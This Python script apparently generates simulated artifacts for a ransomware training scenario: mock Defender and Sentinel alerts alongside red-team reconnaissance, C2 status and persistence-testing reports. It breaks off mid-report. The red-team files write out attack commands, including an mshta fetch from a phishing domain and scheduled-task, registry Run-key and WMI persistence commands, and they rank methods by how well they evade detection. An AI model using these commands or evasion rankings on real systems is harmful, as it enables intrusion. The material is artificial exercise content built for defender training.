"""
Generate artifact files for the intermediate Ransomware scenario: "Ransomware Attack: Corporate Network Compromise"
Creates realistic Microsoft Defender, Sentinel, Purview, and Red Team tool outputs with detailed E5 security tool formatting.
"""
import os
from pathlib import Path

# Artifacts directory - match the path expected by the artifacts router
ARTIFACTS_DIR = Path("/app/artifacts/files")
ARTIFACTS_DIR.mkdir(parents=True, exist_ok=True)


def create_phase1_artifacts():
    """Phase 1: Initial Access - HR vs Operations Department"""
    
    # Blue Team: HR Department Defender Alert
    content = """Microsoft Defender for Endpoint Alert
==========================================
Alert ID: DA-2024-003892
Severity: High
Time: 08:47:23 UTC
Device: WS-HR-042
Device ID: 12345678-1234-1234-1234-123456789012
User: hr.manager@corp.local
User SID: S-1-5-21-1234567890-123456789-123456789-1234
Department: Human Resources
Domain: CORP.LOCAL

ALERT DETAILS:
--------------
Alert Title: Suspicious email attachment execution detected
Alert Type: Malware Execution
MITRE ATT&CK Technique: T1566.001 (Phishing: Spearphishing Attachment)
MITRE ATT&CK Tactic: Initial Access
Confidence: High (95%)

PROCESS INFORMATION:
--------------------
Process Name: mshta.exe
Process ID: 4829
Parent Process: outlook.exe (PID: 4712)
Command Line: mshta.exe "https://secure-payroll-update.tk/invoice.hta"
File Path: C:\\Users\\hr.manager\\AppData\\Local\\Temp\\invoice.hta
File Hash (SHA256): 9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e
File Hash (MD5): 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d

ACTION TAKEN:
-------------
Status: BLOCKED by Microsoft Defender for Endpoint
Blocking Reason: Suspicious script execution from email attachment
Automated Response: Device isolated automatically
Isolation Type: Network isolation (restricted network access)
Isolation Time: 08:47:25 UTC

ENDPOINT PROTECTION STATUS:
---------------------------
EDR Agent: Microsoft Defender for Endpoint
Agent Version: 10.0.26100.1 (Latest)
Agent Status: Active and Healthy
Last Update: 2024-01-15 08:00:00 UTC
Cloud Protection: Enabled
Real-time Protection: Enabled
Behavior Monitoring: Enabled
Network Protection: Enabled
Exploit Protection: Enabled

DEFENDER ANTIVIRUS STATUS:
--------------------------
Antivirus Engine: Microsoft Defender Antivirus
Engine Version: 1.1.26100.1
Definition Version: 1.415.1234.0
Last Scan: 2024-01-15 08:00:00 UTC
Scan Result: Clean
Real-time Protection: ON
Cloud-delivered Protection: ON
Automatic Sample Submission: Enabled

ADVANCED THREAT PROTECTION:
---------------------------
Microsoft Defender for Office 365: Enabled
Safe Attachments: Enabled
Safe Links: Enabled
Anti-Phishing: Enabled
Email Quarantine: 2 emails quarantined from this campaign

AUTOMATED INVESTIGATION:
------------------------
Investigation ID: INV-2024-001234
Status: Completed
Triggered: 08:47:25 UTC (Automatically)
Actions Taken:
  - Device isolated from network
  - Suspicious process terminated
  - Registry changes reverted
  - Scheduled tasks removed
  - Network connections blocked
Result: Threat contained, no further action required

DEVICE RISK ASSESSMENT:
-----------------------
Device Risk Score: Low (35/100)
Risk Factors:
  - Strong EDR coverage (latest agent)
  - Attack successfully blocked
  - Automated response effective
  - No evidence of persistence
  - Network isolation successful

USER CONTEXT:
-------------
User Privileges: Domain User (Standard)
Local Admin: No
Domain Admin: No
Sensitive Data Access: Limited (HR data only)
Last Login: 2024-01-15 08:15:00 UTC
Login Location: On-premises

NETWORK SEGMENTATION:
---------------------
VLAN: HR-ISOLATED-VLAN-10
Network Access: Restricted (HR resources only)
Firewall Rules: Strict (outbound HTTPS/HTTP only)
Network Isolation: Enabled (automated)

SECURITY UPDATES:
-----------------
Last Security Update: 2024-01-14 20:00:00 UTC (1 day ago)
Windows Update Status: Up to date
Patch Level: Current
Vulnerability Status: No critical vulnerabilities

RECOMMENDATION:
---------------
Attack blocked successfully. Device isolated automatically. Low risk of persistence.
No immediate containment action required. Continue monitoring for 24 hours.
Consider user security awareness training to prevent future phishing attempts.

INCIDENT CORRELATION:
---------------------
Related Alerts: 2
Related Devices: 1 (WS-HR-042)
Campaign: Spear-phishing campaign targeting HR and Operations departments
Threat Actor: Unknown (attribution pending)
"""
    
    with open(ARTIFACTS_DIR / "defender_hr_alert_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: defender_hr_alert_phase1.txt")
    
    # Blue Team: Operations Department Defender Alert
    content = """Microsoft Defender for Endpoint Alert
==========================================
Alert ID: DA-2024-003893
Severity: Medium
Time: 08:49:12 UTC
Device: WS-OPS-089
Device ID: 87654321-4321-4321-4321-210987654321
User: ops.coord@corp.local
User SID: S-1-5-21-1234567890-123456789-123456789-5678
Department: Operations
Domain: CORP.LOCAL

ALERT DETAILS:
--------------
Alert Title: Suspicious script execution detected
Alert Type: Suspicious Behavior
MITRE ATT&CK Technique: T1059.003 (Command and Scripting Interpreter: Windows Command Shell)
MITRE ATT&CK Tactic: Execution
Confidence: Medium (72%)

PROCESS INFORMATION:
--------------------
Process Name: wscript.exe
Process ID: 5123
Parent Process: outlook.exe (PID: 4987)
Command Line: wscript.exe "C:\\Users\\ops.coord\\AppData\\Local\\Temp\\invoice.vbs"
File Path: C:\\Users\\ops.coord\\AppData\\Local\\Temp\\invoice.vbs
File Hash (SHA256): 8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c
File Hash (MD5): 2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e

ACTION TAKEN:
-------------
Status: DETECTED (not blocked)
Detection Reason: Suspicious script execution from email attachment
Automated Response: Alert generated, investigation initiated
Isolation Type: None (device not isolated)
Detection Time: 08:49:15 UTC

ENDPOINT PROTECTION STATUS:
---------------------------
EDR Agent: Microsoft Defender for Endpoint
Agent Version: 10.0.19045.1 (OUTDATED - Last updated: 60 days ago)
Agent Status: Active but Outdated
Last Update: 2023-11-15 10:00:00 UTC (60 days ago)
Cloud Protection: Enabled (but agent outdated, reduced capabilities)
Real-time Protection: Enabled
Behavior Monitoring: Enabled (limited due to outdated agent)
Network Protection: Enabled
Exploit Protection: Enabled

DEFENDER ANTIVIRUS STATUS:
--------------------------
Antivirus Engine: Microsoft Defender Antivirus
Engine Version: 1.1.19045.1 (OUTDATED)
Definition Version: 1.380.9876.0 (OUTDATED - 60 days old)
Last Scan: 2024-01-15 08:30:00 UTC
Scan Result: Clean (but definitions outdated)
Real-time Protection: ON
Cloud-delivered Protection: ON (but agent outdated)
Automatic Sample Submission: Enabled

ADVANCED THREAT PROTECTION:
---------------------------
Microsoft Defender for Office 365: Enabled
Safe Attachments: Enabled
Safe Links: Enabled (but 7/18 emails delivered)
Anti-Phishing: Enabled
Email Quarantine: 11 emails quarantined, 7 delivered

AUTOMATED INVESTIGATION:
------------------------
Investigation ID: INV-2024-001235
Status: In Progress
Triggered: 08:49:18 UTC (Automatically, but delayed due to outdated agent)
Actions Taken:
  - Alert generated
  - Process monitoring initiated
  - Network connections logged
  - File system changes tracked
Result: Investigation ongoing, script executed successfully before detection

DEVICE RISK ASSESSMENT:
-----------------------
Device Risk Score: High (82/100)
Risk Factors:
  - Outdated EDR agent (60 days old)
  - Attack detected but NOT blocked
  - Script executed successfully
  - Potential persistence mechanisms deployed
  - Network access not restricted
  - Standard VLAN (broader network access)

USER CONTEXT:
-------------
User Privileges: Domain User (Standard)
Local Admin: Yes (local administrator account present)
Domain Admin: No
Sensitive Data Access: Moderate (Operations data)
Last Login: 2024-01-15 08:20:00 UTC
Login Location: On-premises

NETWORK SEGMENTATION:
---------------------
VLAN: OPS-STANDARD-VLAN-20
Network Access: Standard (Operations and shared resources)
Firewall Rules: Moderate (standard outbound rules)
Network Isolation: Not enabled

SECURITY UPDATES:
-----------------
Last Security Update: 2023-11-15 20:00:00 UTC (60 days ago)
Windows Update Status: OUTDATED
Patch Level: 60 days behind
Vulnerability Status: 3 critical vulnerabilities unpatched

RECOMMENDATION:
---------------
WARNING: Outdated EDR agent may have reduced detection capabilities. 
Script executed successfully. Device requires immediate attention.
Priority: HIGH - Isolate device and investigate for persistence mechanisms.
Update EDR agent and security definitions immediately.
Consider network isolation to prevent lateral movement.

INCIDENT CORRELATION:
---------------------
Related Alerts: 3
Related Devices: 1 (WS-OPS-089)
Campaign: Spear-phishing campaign targeting HR and Operations departments
Threat Actor: Unknown (attribution pending)
Risk Level: HIGH - Successful execution, outdated security controls
"""
    
    with open(ARTIFACTS_DIR / "defender_ops_alert_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: defender_ops_alert_phase1.txt")
    
    # Blue Team: Sentinel Phishing Analysis
    content = """Microsoft Sentinel Incident Report
========================================
Incident ID: INC-2024-00456
Title: Spear-Phishing Campaign - HR and Operations Departments Affected
Severity: High
Status: Active Investigation
Created: 2024-01-15 08:50:00 UTC
Last Updated: 2024-01-15 08:55:00 UTC
Owner: Security Operations Center

EXECUTIVE SUMMARY:
------------------
A sophisticated spear-phishing campaign has successfully delivered malicious emails to two departments:
- Human Resources Department: 12 emails opened, 4 links clicked
- Operations Department: 18 emails opened, 7 links clicked

Both departments have users who clicked malicious links, resulting in initial access attempts on workstations in both departments.

EMAIL SECURITY ANALYSIS (Microsoft Defender for Office 365):
-------------------------------------------------------------
Total Emails Delivered: 30
Total Emails Blocked: 19 (63% success rate)
Total Emails Delivered: 11 (37% delivery rate)

HR Department:
- Emails Sent: 12
- Emails Blocked: 8 (67% blocked)
- Emails Delivered: 4 (33% delivered)
- Links Clicked: 4
- Safe Links Protection: 8/12 emails blocked
- Anti-Phishing: 6/12 emails flagged

Operations Department:
- Emails Sent: 18
- Emails Blocked: 11 (61% blocked)
- Emails Delivered: 7 (39% delivered)
- Links Clicked: 7
- Safe Links Protection: 11/18 emails blocked
- Anti-Phishing: 9/18 emails flagged

EMAIL CHARACTERISTICS:
---------------------
Sender Domain: secure-payroll-update.tk (suspicious, newly registered)
Subject Lines:
  - "URGENT: Payroll Update Required - Action Needed"
  - "Important: Employee Benefits Enrollment"
  - "Time-Sensitive: HR Policy Update"
  
Email Content:
  - Appears to be from internal HR department
  - Contains typosquatting domain
  - Uses urgency tactics
  - Contains malicious links to .hta and .vbs files

ENDPOINT RESPONSE ANALYSIS:
---------------------------
HR Department (WS-HR-042):
- Alert Generated: YES (DA-2024-003892)
- Action Taken: BLOCKED by Defender for Endpoint
- EDR Agent: Latest Version (10.0.26100.1)
- Detection Time: 08:47:23 UTC
- Response Time: 2 seconds (automated)
- Device Isolated: YES (automated)
- Risk Score: Low (35/100)

Operations Department (WS-OPS-089):
- Alert Generated: YES (DA-2024-003893)
- Action Taken: DETECTED (not blocked)
- EDR Agent: OUTDATED (10.0.19045.1, 60 days old)
- Detection Time: 08:49:12 UTC
- Response Time: 3 seconds (delayed due to outdated agent)
- Device Isolated: NO (not isolated)
- Risk Score: High (82/100)

RISK ASSESSMENT:
----------------
HR Department: LOW RISK
- Strong EDR coverage (latest agent)
- Attack successfully blocked
- Automated response effective
- Device isolated automatically
- No evidence of persistence
- Network segmentation: Isolated VLAN

Operations Department: HIGH RISK
- Outdated EDR agent (60 days old)
- Attack detected but NOT blocked
- Script executed successfully
- Potential persistence mechanisms deployed
- Network access not restricted
- Network segmentation: Standard VLAN (broader access)

NETWORK ANALYSIS:
----------------
HR Department:
- VLAN: HR-ISOLATED-VLAN-10
- Network Access: Restricted (HR resources only)
- Firewall Rules: Strict
- Network Isolation: Enabled

Operations Department:
- VLAN: OPS-STANDARD-VLAN-20
- Network Access: Standard (Operations and shared resources)
- Firewall Rules: Moderate
- Network Isolation: Not enabled

THREAT INTELLIGENCE:
--------------------
IOC Type: Domain
IOC Value: secure-payroll-update.tk
First Seen: 2024-01-14 12:00:00 UTC
Reputation: Malicious (high confidence)
Threat Category: Phishing, Malware Distribution
Related Campaigns: 3 similar campaigns in past 30 days

RECOMMENDATION:
---------------
PRIORITY: HIGH - Operations Department (WS-OPS-089)

Immediate Actions Required:
1. Isolate WS-OPS-089 from network immediately
2. Investigate for persistence mechanisms (scheduled tasks, registry, services)
3. Update EDR agent and security definitions on WS-OPS-089
4. Review network traffic from WS-OPS-089 for C2 communications
5. Consider isolating Operations VLAN if lateral movement detected

Secondary Actions:
1. Continue monitoring HR department (WS-HR-042) for 24 hours
2. User security awareness training for both departments
3. Review email security policies and Safe Links configuration
4. Update threat intelligence feeds with new IOCs

RISK SCORING:
-------------
HR Department Risk Score: 35/100 (LOW)
Operations Department Risk Score: 82/100 (HIGH)

Overall Campaign Risk: MEDIUM-HIGH
Primary Concern: Operations Department successful execution and outdated security controls
"""
    
    with open(ARTIFACTS_DIR / "sentinel_phishing_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: sentinel_phishing_phase1.txt")
    
    # Red Team: HR Reconnaissance
    content = """Target Reconnaissance Report
============================
Target: HR Department (WS-HR-042)
User: hr.manager@corp.local
Reconnaissance Date: 2024-01-15 08:45:00 UTC
Operator: RED-TEAM-ALPHA

INITIAL ACCESS STATUS:
----------------------
✓ Email delivered: YES
✓ Link clicked: YES
✓ Payload executed: YES (mshta.exe)
✓ C2 beacon established: NO (BLOCKED immediately)
✓ Persistence deployed: NO (all attempts blocked)

SYSTEM INFORMATION:
--------------------
Operating System: Windows 11 Enterprise
OS Build: 22621.3007
Domain: CORP.LOCAL
Computer Name: WS-HR-042
User Account: hr.manager@corp.local
User SID: S-1-5-21-1234567890-123456789-123456789-1234

USER PRIVILEGES:
---------------
Domain User: Standard User
Local Admin: No
Domain Admin: No
Sensitive Data Access: Limited (HR data only)
Account Type: Regular user account

EDR AGENT STATUS:
-----------------
EDR Product: Microsoft Defender for Endpoint
Agent Version: 10.0.26100.1 (LATEST - Updated 1 day ago)
Agent Status: ACTIVE and HEALTHY
Cloud Protection: ENABLED
Real-time Protection: ENABLED
Behavior Monitoring: ENABLED
Network Protection: ENABLED
Exploit Protection: ENABLED

DEFENDER ANTIVIRUS STATUS:
--------------------------
Engine Version: 1.1.26100.1 (LATEST)
Definition Version: 1.415.1234.0 (CURRENT)
Last Update: 2024-01-15 08:00:00 UTC (1 day ago)
Real-time Protection: ON
Cloud-delivered Protection: ON

SECURITY POSTURE ASSESSMENT:
----------------------------
EDR Coverage: EXCELLENT (latest agent, active monitoring)
Detection Risk: VERY HIGH (attack was BLOCKED immediately)
Persistence Difficulty: VERY HIGH (requires bypassing strong EDR)
User Privileges: MEDIUM (standard user, no admin)
Network Isolation: HIGH (isolated VLAN, limited lateral movement)
Security Updates: CURRENT (updated 1 day ago)
Patch Level: UP TO DATE

NETWORK SEGMENTATION:
---------------------
VLAN: HR-ISOLATED-VLAN-10
Network Access: RESTRICTED (HR resources only)
Firewall Rules: STRICT (outbound HTTPS/HTTP only)
Network Isolation: ENABLED (automated isolation on detection)
Lateral Movement Potential: LOW (isolated network)

C2 COMMUNICATION STATUS:
------------------------
Connection Attempt: 08:47:25 UTC
C2 Server: 185.220.101.78:443
Protocol: HTTPS
Status: BLOCKED by Defender for Endpoint
Blocking Time: 08:47:25 UTC (immediate)
Last Check-in: N/A (connection never established)
Detection: VERY HIGH - Defender blocked connection immediately

PERSISTENCE ATTEMPTS:
---------------------
Scheduled Task: BLOCKED
Registry Run Key: BLOCKED
WMI Event Subscription: BLOCKED
Service Creation: BLOCKED
All persistence mechanisms: FAILED

OVERALL ASSESSMENT:
-------------------
Target Value: MEDIUM (standard user, HR data)
Security Posture: EXCELLENT (strong EDR, latest agent)
Attack Success: FAILED (blocked immediately)
Persistence Success: FAILED (all attempts blocked)
Detection Risk: VERY HIGH
Recommended Action: NOT RECOMMENDED for initial persistence

CONCLUSION:
-----------
High-value target (HR data) but EXCELLENT security controls. 
Attack was blocked immediately. Establishing persistence will be extremely 
difficult and high-risk. Not recommended for initial persistence efforts.

Better targets likely exist with weaker security controls.
"""
    
    with open(ARTIFACTS_DIR / "hr_recon_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: hr_recon_phase1.txt")
    
    # Red Team: Operations Reconnaissance
    content = """Target Reconnaissance Report
============================
Target: Operations Department (WS-OPS-089)
User: ops.coord@corp.local
Reconnaissance Date: 2024-01-15 08:48:00 UTC
Operator: RED-TEAM-ALPHA

INITIAL ACCESS STATUS:
----------------------
✓ Email delivered: YES
✓ Link clicked: YES
✓ Payload executed: YES (wscript.exe)
✓ C2 beacon established: YES (ACTIVE)
✓ Persistence deployed: PARTIAL (some mechanisms successful)

SYSTEM INFORMATION:
--------------------
Operating System: Windows 10 Enterprise
OS Build: 19045.3803
Domain: CORP.LOCAL
Computer Name: WS-OPS-089
User Account: ops.coord@corp.local
User SID: S-1-5-21-1234567890-123456789-123456789-5678

USER PRIVILEGES:
---------------
Domain User: Standard User
Local Admin: YES (local administrator account present)
Domain Admin: No
Sensitive Data Access: Moderate (Operations data)
Account Type: Regular user with local admin rights

EDR AGENT STATUS:
-----------------
EDR Product: Microsoft Defender for Endpoint
Agent Version: 10.0.19045.1 (OUTDATED - Last updated: 60 days ago)
Agent Status: ACTIVE but OUTDATED
Cloud Protection: ENABLED (but agent outdated, reduced capabilities)
Real-time Protection: ENABLED
Behavior Monitoring: ENABLED (limited due to outdated agent)
Network Protection: ENABLED
Exploit Protection: ENABLED

DEFENDER ANTIVIRUS STATUS:
--------------------------
Engine Version: 1.1.19045.1 (OUTDATED)
Definition Version: 1.380.9876.0 (OUTDATED - 60 days old)
Last Update: 2023-11-15 10:00:00 UTC (60 days ago)
Real-time Protection: ON
Cloud-delivered Protection: ON (but agent outdated)

SECURITY POSTURE ASSESSMENT:
----------------------------
EDR Coverage: WEAK (outdated agent, may have detection gaps)
Detection Risk: MEDIUM (attack was DETECTED but not blocked)
Persistence Difficulty: MEDIUM (local admin account available, weaker EDR)
User Privileges: MEDIUM-HIGH (standard user but admin on device)
Network Isolation: LOW (standard VLAN, good lateral movement potential)
Security Updates: OUTDATED (60 days behind)
Patch Level: 60 DAYS BEHIND

NETWORK SEGMENTATION:
---------------------
VLAN: OPS-STANDARD-VLAN-20
Network Access: STANDARD (Operations and shared resources)
Firewall Rules: MODERATE (standard outbound rules)
Network Isolation: NOT ENABLED
Lateral Movement Potential: HIGH (standard network, broader access)

C2 COMMUNICATION STATUS:
------------------------
Connection Attempt: 08:49:18 UTC
C2 Server: 185.220.101.78:443
Protocol: HTTPS
Status: ACTIVE and OPERATIONAL
Connection Established: 08:49:20 UTC
Last Check-in: 08:55:00 UTC (ongoing, stable)
Beacon Interval: 5 minutes
Detection: MEDIUM - Detected but not blocked

PERSISTENCE ATTEMPTS:
---------------------
Scheduled Task: DETECTED (not blocked, may be successful)
Registry Run Key: DETECTED (not blocked, likely successful)
WMI Event Subscription: BLOCKED
Service Creation: BLOCKED
Persistence Status: PARTIAL SUCCESS

VULNERABILITY STATUS:
---------------------
Critical Vulnerabilities: 3 unpatched
- CVE-2024-XXXXX: Local Privilege Escalation (unpatched)
- CVE-2024-YYYYY: Remote Code Execution (unpatched)
- CVE-2024-ZZZZZ: Information Disclosure (unpatched)
Exploit Availability: Public exploits available for 2/3 CVEs

OVERALL ASSESSMENT:
-------------------
Target Value: MEDIUM-HIGH (Operations data, local admin access)
Security Posture: WEAK (outdated EDR, unpatched vulnerabilities)
Attack Success: SUCCESSFUL (script executed, C2 established)
Persistence Success: PARTIAL (some mechanisms successful)
Detection Risk: MEDIUM
Recommended Action: RECOMMENDED for initial persistence

CONCLUSION:
-----------
Medium-value target with WEAKER security controls. 
Attack was detected but not blocked. Outdated EDR agent provides opportunity 
for persistence with lower detection risk. Better target for establishing foothold.

Local admin account and unpatched vulnerabilities provide additional attack surface.
"""
    
    with open(ARTIFACTS_DIR / "ops_recon_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: ops_recon_phase1.txt")
    
    # Red Team: C2 Status Comparison
    content = """C2 Communication Status Report
================================
Report Date: 2024-01-15 08:55:00 UTC
Operator: RED-TEAM-ALPHA
C2 Server: 185.220.101.78:443

TARGET 1: WS-HR-042 (HR Department)
------------------------------------
Connection Status: ESTABLISHED then TERMINATED
Connection Time: 08:47:25 UTC
Termination Time: 08:47:25 UTC (immediate)
Duration: < 1 second
Server: 185.220.101.78:443
Protocol: HTTPS
Status: BLOCKED by Defender for Endpoint

Detection Level: VERY HIGH
- Defender blocked connection immediately
- Network isolation triggered automatically
- All C2 traffic blocked

Persistence Status: FAILED
- All persistence mechanisms blocked
- Scheduled tasks: BLOCKED
- Registry Run Keys: BLOCKED
- WMI Subscriptions: BLOCKED
- Service Creation: BLOCKED

Risk Assessment: HIGH
- Strong EDR (latest agent)
- Isolated network (limited lateral movement)
- Automated response effective
- High detection risk

Recommendation: NOT VIABLE - Strong security controls, immediate blocking

TARGET 2: WS-OPS-089 (Operations Department)
--------------------------------------------
Connection Status: ACTIVE and OPERATIONAL
Connection Time: 08:49:20 UTC
Last Check-in: 08:55:00 UTC (ongoing)
Duration: 5+ minutes (stable)
Server: 185.220.101.78:443
Protocol: HTTPS
Status: OPERATIONAL

Detection Level: MEDIUM
- Detected but not blocked
- Alert generated but device not isolated
- C2 traffic ongoing

Persistence Status: PARTIAL SUCCESS
- Scheduled tasks: DETECTED (not blocked, may be successful)
- Registry Run Keys: DETECTED (not blocked, likely successful)
- WMI Subscriptions: BLOCKED
- Service Creation: BLOCKED

Risk Assessment: MEDIUM
- Outdated EDR (60 days old)
- Standard network (good lateral movement potential)
- Automated response delayed/ineffective
- Medium detection risk

Recommendation: VIABLE - Weaker security controls, successful C2, partial persistence

COMPARISON SUMMARY:
-------------------
Target          | C2 Status    | Detection | Persistence | Risk    | Viable
----------------|--------------|-----------|-------------|---------|--------
WS-HR-042       | BLOCKED      | VERY HIGH | FAILED      | HIGH    | NO
WS-OPS-089      | OPERATIONAL  | MEDIUM    | PARTIAL      | MEDIUM  | YES

FINAL RECOMMENDATION:
---------------------
Focus persistence efforts on WS-OPS-089 (Operations Department).

Reasons:
1. C2 connection is ACTIVE and OPERATIONAL
2. Outdated EDR agent provides detection gaps
3. Partial persistence success (Registry Run Keys likely successful)
4. Standard network allows for lateral movement
5. Local admin account available for privilege escalation
6. Medium detection risk (vs. very high for HR)

HR target (WS-HR-042) has excellent EDR and blocked our attack immediately.
Operations target (WS-OPS-089) has outdated agent and better opportunity for 
successful persistence with lower detection risk.
"""
    
    with open(ARTIFACTS_DIR / "c2_status_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: c2_status_phase1.txt")


def create_phase2_artifacts():
    """Phase 2: Establishing Persistence"""
    
    # Red Team: Persistence Method Testing
    content = """Persistence Method Testing Results
====================================
Test Date: 2024-01-15 09:05:00 UTC
Target: WS-OPS-089 (Operations Department)
Operator: RED-TEAM-ALPHA

TESTING METHODOLOGY:
--------------------
Three persistence mechanisms tested:
1. Scheduled Tasks (schtasks.exe)
2. Registry Run Keys (reg.exe)
3. WMI Event Subscriptions (wmic.exe)

Each method tested for:
- Reliability (successful deployment)
- Detection risk (security tool response)
- Stealth (logging and visibility)
- Persistence (survives reboot)

TEST RESULTS:
-------------

1. SCHEDULED TASKS (schtasks.exe)
----------------------------------
Deployment: SUCCESSFUL
Command: schtasks.exe /Create /TN "UpdateCheck" /TR "powershell.exe -File C:\\Temp\\payload.dll"
Status: Task created successfully
Detection: DETECTED and LOGGED
Detection Confidence: High
Security Response: Alert generated, process monitored
Blocking: NOT BLOCKED (task created)

Reliability: HIGH (8/10)
- Task creation successful
- Task visible in Task Scheduler
- Executes on schedule reliably

Detection Risk: MEDIUM (6/10)
- Process creation logged
- Task visible in Task Scheduler GUI
- Defender alert generated
- Event logs contain entries

Stealth: MEDIUM (5/10)
- Visible in Task Scheduler
- Logged in Windows Event Logs
- Defender monitoring active

Persistence: HIGH (9/10)
- Survives reboot
- Executes on schedule
- Can be configured for multiple triggers

Overall Score: 7.0/10

2. REGISTRY RUN KEYS (reg.exe)
-------------------------------
Deployment: SUCCESSFUL
Command: reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateCheck" /t REG_SZ /d "powershell.exe -File C:\\Temp\\payload.dll"
Status: Registry key modified successfully
Detection: DETECTED and LOGGED
Detection Confidence: Medium
Security Response: Alert generated, change logged
Blocking: NOT BLOCKED (registry modified)

Reliability: HIGH (9/10)
- Registry modification successful
- Key persists across reboots
- Executes on user login reliably

Detection Risk: LOW (4/10)
- Registry change logged but not heavily monitored
- Less visible than scheduled tasks
- Defender alert generated but lower priority
- Event logs contain entries but less prominent

Stealth: HIGH (7/10)
- Not visible in Task Scheduler
- Hidden in registry (requires regedit to view)
- Less obvious to casual inspection
- Defender monitoring present but less aggressive

Persistence: HIGH (9/10)
- Survives reboot
- Executes on user login
- Can be configured for multiple run keys

Overall Score: 7.25/10 (BEST BALANCE)

3. WMI EVENT SUBSCRIPTIONS (wmic.exe)
-------------------------------------
Deployment: FAILED
Command: wmic.exe /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="UpdateCheck", EventNamespace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
Status: WMI subscription creation BLOCKED
Detection: DETECTED and BLOCKED
Detection Confidence: Very High
Security Response: Blocked by Defender
Blocking: BLOCKED (subscription not created)

Reliability: LOW (2/10)
- Subscription creation blocked
- Deployment failed
- Cannot establish persistence

Detection Risk: VERY HIGH (9/10)
- Highly monitored by Defender
- Immediate blocking
- Very high visibility
- Strong security tool response

Stealth: LOW (2/10)
- Highly monitored
- Immediate detection
- Very visible to security tools

Persistence: N/A (deployment failed)

Overall Score: 2.0/10 (NOT VIABLE)

DETECTION RISK COMPARISON:
--------------------------
Method                  | Detection Risk | Security Response | Viable
------------------------|----------------|-------------------|--------
Scheduled Tasks         | MEDIUM (6/10)  | Alert generated   | YES
Registry Run Keys       | LOW (4/10)     | Alert generated   | YES (BEST)
WMI Event Subscriptions | VERY HIGH (9/10)| BLOCKED          | NO

RECOMMENDATION:
---------------
Deploy Registry Run Keys for persistence.

Reasons:
1. Best balance of reliability and low detection risk
2. Successful deployment (not blocked)
3. Lower detection risk than scheduled tasks
4. Higher stealth than scheduled tasks
5. Reliable persistence across reboots
6. Less visible to casual inspection

Scheduled Tasks are viable but have higher detection risk.
WMI Event Subscriptions are not viable (blocked immediately).
"""
    
    with open(ARTIFACTS_DIR / "persistence_testing_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: persistence_testing_phase2.txt")
    
    # Red Team: Detection Risk Assessment
    content = """Detection Risk Assessment
==========================
Assessment Date: 2024-01-15 09:10:00 UTC
Target: WS-OPS-089 (Operations Department)
Operator: RED-TEAM-ALPHA

ASSESSMENT METHODOLOGY:
------------------------
Each persistence method evaluated for:
1. Security tool monitoring level
2. Logging and visibility
3. Automated response capability
4. Detection confidence
5. Blocking probability

ASSESSMENT RESULTS:
-------------------

1. SCHEDULED TASKS
------------------
Security Tool Monitoring: HIGH
- Defender for Endpoint: Active monitoring
- Process creation logged
- Task creation events logged
- Scheduled task registry monitored

Logging and Visibility: HIGH
- Windows Event Log: TaskScheduler/Operational
- Task visible in Task Scheduler GUI
- Process tree logged
- Command line arguments logged

Automated Response: MEDIUM
- Alert generated
- Process monitored
- Task creation logged
- NOT automatically blocked

Detection Confidence: HIGH (85%)
- High confidence detection
- Clear indicators
- Multiple detection sources

Blocking Probability: LOW (20%)
- Task creation not blocked
- Execution may be monitored
- Low probability of immediate blocking

Overall Detection Risk: MEDIUM (6/10)

2. REGISTRY RUN KEYS
---------------------
Security Tool Monitoring: MEDIUM
- Defender for Endpoint: Active monitoring (lower priority)
- Registry changes logged
- Run key modifications tracked
- Less aggressive monitoring than scheduled tasks

Logging and Visibility: MEDIUM
- Windows Event Log: Security (registry changes)
- Registry audit logs
- Less visible than scheduled tasks
- Requires regedit to view

Automated Response: LOW
- Alert generated (lower priority)
- Change logged
- NOT automatically blocked
- Less aggressive response

Detection Confidence: MEDIUM (65%)
- Medium confidence detection
- Some indicators
- Less clear than scheduled tasks

Blocking Probability: VERY LOW (10%)
- Registry modification not blocked
- Low probability of blocking
- Less aggressive response

Overall Detection Risk: LOW (4/10) - BEST OPTION

3. WMI EVENT SUBSCRIPTIONS
--------------------------
Security Tool Monitoring: VERY HIGH
- Defender for Endpoint: Aggressive monitoring
- WMI activity heavily monitored
- Immediate detection
- High priority alerts

Logging and Visibility: VERY HIGH
- Windows Event Log: Multiple sources
- WMI activity logged extensively
- Very visible to security tools
- High priority monitoring

Automated Response: VERY HIGH
- Immediate blocking
- Subscription creation blocked
- Aggressive response
- High priority alert

Detection Confidence: VERY HIGH (95%)
- Very high confidence detection
- Clear indicators
- Multiple detection sources
- Immediate response

Blocking Probability: VERY HIGH (90%)
- Subscription creation blocked
- High probability of blocking
- Very aggressive response

Overall Detection Risk: VERY HIGH (9/10) - NOT VIABLE

COMPARISON SUMMARY:
-------------------
Method                  | Detection Risk | Blocking Prob | Viable
------------------------|----------------|---------------|--------
Scheduled Tasks         | MEDIUM (6/10)  | LOW (20%)     | YES
Registry Run Keys       | LOW (4/10)     | VERY LOW (10%)| YES (BEST)
WMI Event Subscriptions | VERY HIGH (9/10)| VERY HIGH (90%)| NO

FINAL RECOMMENDATION:
---------------------
Registry Run Keys offer the BEST balance:
- Lowest detection risk (4/10)
- Lowest blocking probability (10%)
- Successful deployment
- Reliable persistence
- Good stealth characteristics

Scheduled Tasks are viable but have higher detection risk.
WMI Event Subscriptions are not viable due to very high detection risk and blocking.
"""
    
    with open(ARTIFACTS_DIR / "detection_risk_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: detection_risk_phase2.txt")
    
    # Blue Team: Defender Process Monitoring
    content = """Microsoft Defender for Endpoint - Process Monitoring Report
================================================================
Device: WS-OPS-089
Time Range: 2024-01-15 09:05:00 - 09:15:00 UTC
